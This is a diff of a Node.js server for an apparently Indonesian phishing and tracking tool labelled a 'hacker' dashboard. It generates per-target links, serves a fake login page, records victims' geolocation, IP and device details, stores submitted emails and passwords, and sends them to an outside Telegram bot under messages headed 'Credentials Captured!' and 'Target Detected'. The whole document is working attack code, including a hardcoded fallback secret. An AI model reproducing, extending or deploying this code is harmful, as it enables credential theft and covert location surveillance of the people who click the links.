@@ -1,4 +1,4 @@
-// File: server.js (v6.4 - Final)
+// File: server.js (v7.0 - Final with Telegram Credential Notif)
 
 require('dotenv').config();
 
@@ -23,13 +23,11 @@ const PORT = process.env.PORT || 4000;
 
 const JWT_SECRET = process.env.JWT_SECRET || 'gantidengankatayangsan6atrahas14';
 
-// ================== MIDDLEWARE ================== //
 app.use(cors());
 app.use(express.json());
 app.use(requestIp.mw());
 app.use(express.static(__dirname));
 
-// ================== MIDDLEWARE PROTEKSI RUTE ================== //
 const protectRoute = (req, res, next) => {
     try {
         const token = req.headers.authorization?.split(" ")[1];
@@ -50,20 +48,15 @@ const protectRoute = (req, res, next) => {
 };
 
 // ================== HELPER FUNCTIONS & SOCKET.IO ================== //
+
 const sendTelegramNotification = async (locationData) => {
     const botToken = process.env.TELEGRAM_BOT_TOKEN;
     const chatId = process.env.TELEGRAM_CHAT_ID;
-
     if (!botToken || !chatId) {
-        console.warn('⚠️ Variabel Telegram Bot (TOKEN/CHAT_ID) tidak diatur di .env, notifikasi dilewati.');
+        console.warn('⚠️ Variabel Telegram Bot (TOKEN/CHAT_ID) tidak diatur di .env, notifikasi lokasi dilewati.');
         return;
     }
-
-    const {
-        username, ip_address, city, country, isp, org, proxy,
-        browserInfo, osInfo, latitude, longitude
-    } = locationData;
-
+    const { username, ip_address, city, country, isp, org, proxy, browserInfo, osInfo, latitude, longitude } = locationData;
     const message = `
 *💀 Target Terdeteksi! 💀*
 
@@ -76,7 +69,38 @@ const sendTelegramNotification = async (locationData) => {
 *Perangkat:* ${browserInfo} pada ${osInfo}
 
 *Lihat di Peta:*
-[Google Maps](http://googleusercontent.com/maps.google.com/4{latitude},${longitude})
+[Google Maps](http://maps.google.com/maps?q=${latitude},${longitude})
+    `;
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    try {
+        await axios.post(url, { chat_id: chatId, text: message, parse_mode: 'Markdown' });
+        console.log('✅ Notifikasi Lokasi Telegram berhasil dikirim.');
+    } catch (error) {
+        console.error('❌ Gagal mengirim notifikasi Lokasi Telegram:', error.response ? error.response.data : error.message);
+    }
+};
+
+const sendCredentialsNotification = async (credData) => {
+    const botToken = process.env.TELEGRAM_BOT_TOKEN;
+    const chatId = process.env.TELEGRAM_CHAT_ID;
+
+    if (!botToken || !chatId) {
+        console.warn('⚠️ Variabel Telegram Bot tidak diatur, notifikasi kredensial dilewati.');
+        return;
+    }
+
+    const { username, trackerId, ipAddress, email, password } = credData;
+
+    const message = `
+*🔒 Credentials Captured! 🔒*
+
+*Target ID:* \`${username}\`
+*Link ID:* \`${trackerId}\`
+*IP Address:* \`${ipAddress}\`
+
+*--- CAPTURED DATA ---*
+*Email:* \`${email}\`
+*Password:* \`${password}\`
     `;
 
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -87,9 +111,9 @@ const sendTelegramNotification = async (locationData) => {
             text: message,
             parse_mode: 'Markdown'
         });
-        console.log('✅ Notifikasi Telegram berhasil dikirim.');
+        console.log('✅ Notifikasi Kredensial Telegram berhasil dikirim.');
     } catch (error) {
-        console.error('❌ Gagal mengirim notifikasi Telegram:', error.response ? error.response.data : error.message);
+        console.error('❌ Gagal mengirim notifikasi Kredensial Telegram:', error.response ? error.response.data : error.message);
     }
 };
 
@@ -174,7 +198,6 @@ io.on('connection', (socket) => {
     });
 });
 
-// ================== RUTE PUBLIK (LOGIN & HALAMAN UTAMA) ================== //
 app.get('/', (req, res) => {
     res.redirect('/login.html');
 });
@@ -199,7 +222,6 @@ app.post('/login', async (req, res) => {
     }
 });
 
-// ================== RUTE LINK KLIK & LOG (TETAP PUBLIK) ================== //
 app.get('/:id', async (req, res) => {
     const { id } = req.params;
     const userAgentString = req.headers['user-agent'];
@@ -223,6 +245,8 @@ app.get('/:id', async (req, res) => {
             destinationUrl = url_ios;
         }
 
+        io.emit('link_clicked', { username });
+
         if (link_type === 'direct') {
             fs.readFile(path.join(__dirname, 'tracker.html'), 'utf8', (fsErr, data) => {
                 if (fsErr) return res.status(500).send('Server error');
@@ -232,11 +256,11 @@ app.get('/:id', async (req, res) => {
         } else if (link_type === 'intermediate') {
             fs.readFile(path.join(__dirname, 'login_users.html'), 'utf8', (fsErr, data) => {
                 if (fsErr) return res.status(500).send('Server error');
-                const html = data.replace('{{DESTINATION_URL}}', destinationUrl).replace('{{TRACKER_ID}}', id).replace('{{USERNAME}}', username);
+                const html = data.replace(/{{DESTINATION_URL}}/g, destinationUrl).replace(/{{TRACKER_ID}}/g, id);
                 res.send(html);
             });
         } else {
-            res.status(404).send('<h1>404 Not Found</h1>');
+            res.redirect(destinationUrl);
         }
 
     } catch (error) {
@@ -256,7 +280,7 @@ app.post('/log', async (req, res) => {
         let country = null, city = null, isp = null, org = null, proxy = false;
         try {
             const apiKey = process.env.OPENCAGE_API_KEY;
-            if (apiKey) {
+            if (apiKey && latitude && longitude) {
                 const geoUrl = `https://api.opencagedata.com/geocode/v1/json?q=${latitude}+${longitude}&key=${apiKey}&language=id&pretty=1`;
                 const geoResponse = await axios.get(geoUrl);
                 const components = geoResponse.data.results[0]?.components;
@@ -293,10 +317,10 @@ app.post('/log', async (req, res) => {
         const notificationData = { ...newLocation, username, browserInfo, osInfo };
         await sendTelegramNotification(notificationData);
 
-        broadcastDashboardUpdate();
-        const newLocationDataForMap = { ...newLocation, username };
+        const newLocationDataForMap = { ...newLocation, username, created_at: new Date() };
         io.emit('new_location_logged', newLocationDataForMap);
         
+        broadcastDashboardUpdate();
         res.json({ status: 'success' });
     } catch (error) {
         console.error("Error logging location:", error);
@@ -313,6 +337,14 @@ app.post('/api/credentials', async (req, res) => {
     
     try {
         await db.promise().query('INSERT INTO credentials (tracker_id, email, password, ip_address) VALUES (?, ?, ?, ?)', [trackerId, email, password, ipAddress]);
+        
+        const [rows] = await db.promise().query('SELECT u.username FROM users u JOIN links l ON u.id = l.user_id WHERE l.id = ?', [trackerId]);
+        
+        if (rows.length > 0) {
+            const username = rows[0].username;
+            await sendCredentialsNotification({ username, trackerId, ipAddress, email, password });
+        }
+
         res.status(200).json({ message: 'Credentials logged successfully.' });
         broadcastDashboardUpdate();
     } catch (error) {
@@ -321,7 +353,6 @@ app.post('/api/credentials', async (req, res) => {
     }
 });
 
-// ================== API YANG DIPROTEKSI ================== //
 app.post('/create', protectRoute, async (req, res) => {
     const { username, originalUrl, url_android, url_ios, expiresIn, linkType } = req.body;
     
@@ -339,26 +370,18 @@ app.post('/create', protectRoute, async (req, res) => {
         if (users.length > 0) {
             userId = users[0].id;
         } else {
-            const [result] = await db.promise().query('INSERT INTO users (username) VALUES (?)', [username]);
+            const [result] = await db.promise().query('INSERT INTO users (username, is_admin) VALUES (?, FALSE) ON DUPLICATE KEY UPDATE id=LAST_INSERT_ID(id)', [username]);
             userId = result.insertId;
         }
 
         const id = nanoid(8);
-        const newLinkData = {
-            id,
-            user_id: userId,
-            original_url: originalUrl,
-            url_android: url_android || null,
-            url_ios: url_ios || null,
-            expires_at: expiresAt,
-            link_type: linkType || 'direct'
-        };
+        const newLinkData = { id, user_id: userId, original_url: originalUrl, url_android: url_android || null, url_ios: url_ios || null, expires_at: expiresAt, link_type: linkType || 'direct' };
 
         await db.promise().query('INSERT INTO links SET ?', newLinkData);
         
         broadcastLogMessage(`> Link created for target [${username}] with ID [${id}]`);
         broadcastDashboardUpdate();
-        res.status(201).json({ newLink: `http://localhost:${PORT}/${id}`, username });
+        res.status(201).json({ newLink: `${req.protocol}://${req.get('host')}/${id}`, username });
     } catch (error) {
         console.error("Error creating link:", error);
         res.status(500).json({ error: 'DB error' });
@@ -377,20 +400,6 @@ app.delete('/api/links/:id', protectRoute, async (req, res) => {
     }
 });
 
-app.get('/api/locations', protectRoute, async (req, res) => {
-    try {
-        const [rows] = await db.promise().query(`
-            SELECT l.*, u.username
-            FROM locations l 
-            JOIN users u ON l.user_id = u.id 
-            ORDER BY l.created_at DESC
-        `);
-        res.json(rows);
-    } catch (err) {
-        res.status(500).json({ error: 'Database error' });
-    }
-});
-
 app.get('/api/locations/:trackerId', protectRoute, async (req, res) => {
     const { trackerId } = req.params;
     try {
@@ -399,16 +408,7 @@ app.get('/api/locations/:trackerId', protectRoute, async (req, res) => {
         const parsedLocations = locations.map(loc => {
             const ua = parser.setUA(loc.user_agent || '').getResult();
             const deviceType = ua.device.type || (ua.os.name === 'iOS' || ua.os.name === 'Android' ? 'mobile' : 'desktop');
-            return {
-                ...loc,
-                browser: ua.browser.name ? `${ua.browser.name} ${ua.browser.version || ''}`.trim() : 'Unknown',
-                os: ua.os.name ? `${ua.os.name} ${ua.os.version || ''}`.trim() : 'Unknown',
-                device: {
-                    type: deviceType,
-                    vendor: ua.device.vendor || 'Unknown',
-                    model: ua.device.model || 'N/A'
-                }
-            };
+            return { ...loc, browser: ua.browser.name ? `${ua.browser.name} ${ua.browser.version || ''}`.trim() : 'Unknown', os: ua.os.name ? `${ua.os.name} ${ua.os.version || ''}`.trim() : 'Unknown', device: { type: deviceType, vendor: ua.device.vendor || 'Unknown', model: ua.device.model || 'N/A' } };
         });
         res.json(parsedLocations);
     } catch (error) {
@@ -417,9 +417,8 @@ app.get('/api/locations/:trackerId', protectRoute, async (req, res) => {
     }
 });
 
-// ================== RUN SERVER ================== //
 server.listen(PORT, () => {
-    console.log(`\n HACKER-UI DASHBOARD v6.4 (Final)`);
+    console.log(`\n HACKER-UI DASHBOARD v7.0 (Final)`);
     console.log(`===================================================`);
     console.log(`✅ Server berjalan di http://localhost:${PORT}\n`);
 });
